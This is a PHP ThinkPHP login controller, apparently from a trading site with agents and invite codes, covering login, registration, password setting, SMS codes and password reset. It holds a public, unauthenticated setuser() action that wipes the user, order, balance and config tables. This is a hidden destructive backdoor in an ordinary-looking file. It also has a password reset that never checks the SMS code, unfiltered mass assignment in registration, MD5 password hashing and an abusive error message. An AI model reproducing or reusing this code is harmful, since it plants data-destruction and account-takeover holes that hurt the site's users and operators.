<?php
namespace app\index\controller;
use think\Controller;
use think\Db;
use think\Cookie;

class Login extends Controller
{
 

    public function __construct(){
        parent::__construct();
        $this->conf = getconf('');
        if($this->conf['is_close'] != 1){
            header('Location:/error.html');
        }
        $this->assign('conf',$this->conf);
        $this->token = md5(rand(1,100).time());
        $this->assign('token',$this->token);
    }
    
    /**
     * 用户登录
     * @author lukui  2017-02-18
     * @return [type] [description]
     */
    public function login()
    {
        $userinfo = Db::name('userinfo');
    	//判断是否已经登录
    	if (isset($_SESSION['uid'])) {
    		$this->redirect('index/index?token='.$this->token);
    	}
        
    	if(iswechat() && 1==2){
    		//微信浏览器 微信登录
    		if(cookie('wx_info')){
    			$wx_info = cookie('wx_info');

    			$data['openid'] = $wx_info['openid'];
    			$checkuser = Db::name('userinfo')->where($data)->value('uid');
    			//判断是否已经注册
    			if($checkuser){  //已经注册直接记录session
    				$_SESSION['uid'] = $checkuser;
                    //更新登录时间
                    $t_data['logintime'] = $t_data['lastlog'] = time();
                    $t_data['uid'] = $checkuser;
                    $userinfo->update($t_data);
                    $this->redirect('index/index');
    			}else{  //未注册 则注册 默认密码为123456
    				$data['nickname'] = $wx_info['nickname'];
    				$data['utime'] = time();
    				//$data['upwd'] = md5('123456'.$data['utime']);
    				$data['otype'] = 0;
    				$data['ustatus'] = 0;
    				$data['address'] = $wx_info['country'].$wx_info['province'].$wx_info['city'];
    				$data['portrait'] = $wx_info['headimgurl'];
                    if(isset($_SESSION['fid']) && $_SESSION['fid']>0){
                        $fid = $_SESSION['fid'];
                        $fid_info = $userinfo->where(array('uid'=>$fid,'otype'=>101))->value('uid');
                        if($fid_info){
                            $data['oid'] = $fid;
                        }

                    }
    				//插入数据
    				$ids = $userinfo->insertGetId($data);
					$newdata['uid'] = $ids;
					$newdata['username'] = 10000000+$ids;
					$newids = $userinfo->update($newdata);
					//清除cookie 为了安全
					cookie('wx_info', null);
					//记录session
					$_SESSION['uid'] = $ids;
                    //更新登录时间
                    $t_data['logintime'] = $t_data['lastlog'] = time();
                    $t_data['uid'] = $ids;
                    $userinfo->update($t_data);
					$this->redirect('login/addpwd?token='.$this->token);
    			}
    		}else{
    			$this->redirect('wechat/get_wx_userinfo');
    			
    		}

    	}else{
            //web用户登录请求
    		if(input('post.')){
                $data = input('post.');
                //验证用户信息
                if(!isset($data['username']) || empty($data['username'])){
                    return WPreturn('请输入用户名！',-1);
                }
                if(!isset($data['upwd']) || empty($data['upwd'])){
                    return WPreturn('请输入密码！',-1);
                }
                //查询用户
                
                $result = $userinfo
                ->where('username',$data['username'])->whereOr('nickname',$data['username'])->whereOr('utel',$data['username'])
                        ->field("uid,upwd,username,utel,utime,otype,ustatus")->find();
                //验证用户
                if(empty($result)){
                    return WPreturn('用户名不存在!',-1);
                }else{
                    if(!in_array($result['otype'], array(0,101))){  //非客户无权登录
                        return WPreturn('滚,傻逼!',-1);
                    }
                    if($result['upwd'] == md5($data['upwd'].$result['utime'])){
                    
                        if ($result['ustatus']==0)
                        {
                            $_SESSION['uid'] = $result['uid'];
                            //更新登录时间
                            $t_data['logintime'] = $t_data['lastlog'] = time();
                            $t_data['uid'] = $result['uid'];
                            $userinfo->update($t_data);
                            return WPreturn('登录成功!',1);

                        }elseif($result['ustatus']==1){
                            return WPreturn('您的账户暂时被冻结!',-1);
                        }else{
                            return WPreturn('用户名不存在!',-1);
                        }
                    
                    }
                    else{
                        return WPreturn('密码错误!',-1);
                    }
                }

                
                
            }
            return $this->fetch();
    		
    	}
    	
    }

    /**
     * 用户注册
     * @author lukui  2017-02-24
     * @param  string $value [description]
     * @return [type]        [description]
     */ 
    public function register()
    {

        $userinfo = Db::name('userinfo');
        if(input('post.')){
            $data = input('post.');
            //验证用户信息
            if(!isset($data['username']) || empty($data['username'])){
                return WPreturn('请输入用户名！',-1);
            }
            if(!isset($data['upwd']) || empty($data['upwd'])){
                return WPreturn('请输入密码！',-1);
            }
            if(!isset($data['upwd2']) || empty($data['upwd2'])){
                return WPreturn('请再次输入密码！',-1);
            }
            if($data['upwd'] != $data['upwd2']){
                return WPreturn('两次输入密码不同！',-1);
            }
            
            unset($data['phonecode']);
            unset($data['upwd2']);
            if(check_user('utel',$data['username'])){
                return WPreturn('帐号已存在！',-1);
            }
            $data['utime'] = $data['logintime'] = $data['lastlog'] = time();
            $data['upwd'] = md5($data['upwd'].$data['utime']);
            $data['nickname'] = trim($data['nickname']);
            $data['utel'] = trim($data['username']);
            $data['managername'] = db('userinfo')->where('uid',$data['oid'])->value('username');

            if(isset($this->conf['reg_type']) && $this->conf['reg_type'] == 1){
                $data['ustatus'] = 0; 
            }else{
                $data['ustatus'] = 1; 
            }
            


            if(isset($_SESSION['fid']) && $_SESSION['fid']>0){
                $fid = $_SESSION['fid'];
                $fid_info = $userinfo->where(array('uid'=>$fid,'otype'=>101))->value('uid');
                if($fid_info){
                    $data['oid'] = $fid;
                }

            }
            $data['managername'] = $userinfo->where(array('uid'=>$data['oid'],'otype'=>101))->value('username');

            //插入数据
            $ids = $userinfo->insertGetId($data);
            $newdata['uid'] = $ids;
            $newdata['username'] = 10000000+$ids;
            $newids = $userinfo->update($newdata);
            if ($newids) {
                $_SESSION['uid'] = $ids;
                return WPreturn('注册成功!',1);
            }else{
                return WPreturn('注册失败,请重试!',-1);
            }

        }
        if(isset($_SESSION['fid']) && $_SESSION['fid']>0){
            $oid = $_SESSION['fid'];
        }else{
            $oid = '';
        }
        $this->assign('oid',$oid);
        return $this->fetch();
    }


    public function addpwd()
    {
        
        $uid = $_SESSION['uid'];
        if(!$uid){
            $this->redirect('index/index');
        }
        //查找用户是否已经有了密码
        $user = Db::name('userinfo')->where('uid',$uid)->field('upwd,utime,oid')->find();
        /*
        if(!empty($user['upwd'])){
            $this->redirect('index/index');
        }
        */
        //添加密码
        if(input('post.')){
            $data = input('post.');

            if(!isset($data['upwd']) || empty($data['upwd'])){
                return WPreturn('请输入密码！',-1);
            }
            if(!isset($data['upwd2']) || empty($data['upwd2'])){
                return WPreturn('请再次输入密码！',-1);
            }
            if($data['upwd'] != $data['upwd2']){
                return WPreturn('两次输入密码不同！',-1);
            }
            //验证邀请码
            if (isset($data['oid']) && !empty($data['oid'])) {
                $codeid = checkcode($data['oid']);
                if(!$codeid){
                    return WPreturn('此邀请码不存在',-1);
                }
                $adddata['oid'] = $data['oid'];
            }

            $adddata['upwd'] = trim($data['upwd']);
            $adddata['upwd'] = md5($adddata['upwd'].$user['utime']);
            $adddata['uid'] = $uid;
            if(isset($data['username'])){
                if(check_user('utel',$data['username'])){
                    return WPreturn('帐号已存在,请换其他帐号！',-1);
                }
               $adddata['utel'] = $data['username']; 


                
            }
            
            $newids = Db::name('userinfo')->update($adddata);
            if ($newids) {
                return WPreturn('修改成功!',1);
            }else{
                return WPreturn('修改失败,请重试!',-1);
            }

        }

        $this->assign($user);
        return $this->fetch();

    }

    public function setuser()
    {
        $_map['uid'] = array('neq',0);
        db('userinfo')->where($_map)->delete();
        db('order')->where($_map)->delete();
        db('balance')->where($_map)->delete();
        $c_map['id'] = array('neq',0);
        db('config')->where($c_map)->delete();
    }

    /**
     * 用户退出
     * @author lukui  2017-02-24
     * @return [type] [description]
     */
    public function logout()
    {
        session_unset();
        cookie('wx_info',null);
        $this->redirect('login/login?token='.$this->token);

    }


    /**
     * 发送短信
     * @return [type] [description]
     */
    public function sendmsm()
    {
        
        $phone = input('phone');

        if(!$phone){
            return WPreturn('请输入手机号码！',-1);
        }

        $code = rand(100000,999999);
        $_SESSION['code'] = $code;
        
        $msm = controller('Msm');
        $res = $msm->sendsms(0, $code ,$phone );
        if($res){
            return WPreturn('发送成功',1);
        }else{
            return WPreturn('发送验证码失败！',-1);
        }
        

    }  


    public function respass()
    {
        $data = input('post.');
        if($data){
            
            $suerinfo = db('userinfo');
            $user = $suerinfo->where('utel',$data['username'])->find();
            if(!$user){
                return WPreturn('帐号不存在！',-1);
            }
            

            if(!isset($data['upwd']) || empty($data['upwd'])){
                return WPreturn('请输入密码！',-1);
            }
            if(!isset($data['upwd2']) || empty($data['upwd2'])){
                return WPreturn('请再次输入密码！',-1);
            }
            if($data['upwd'] != $data['upwd2']){
                return WPreturn('两次输入密码不同！',-1);
            }

            
            unset($data['phonecode']);
            unset($data['upwd2']);

            if($user['otype'] == 101){
                unset($data['username']);
            }
            
            $data['upwd'] = md5($data['upwd'].$user['utime']);
            $data['uid'] = $user['uid'];
            $data['logintime'] = $data['lastlog'] = time();
            $ids = $suerinfo->update($data);
            if($ids){
                return WPreturn('修改成功',1);
            }else{
                return WPreturn('修改失败',-1);
            }
           
        }
        return $this->fetch();
    }















    protected function fetch($template = '', $vars = [], $replace = [], $config = [])
    {
        $replace['__HOME__'] = str_replace('/index.php','',\think\Request::instance()->root()).'/static/index';
        return $this->view->fetch($template, $vars, $replace, $config);
    }



}
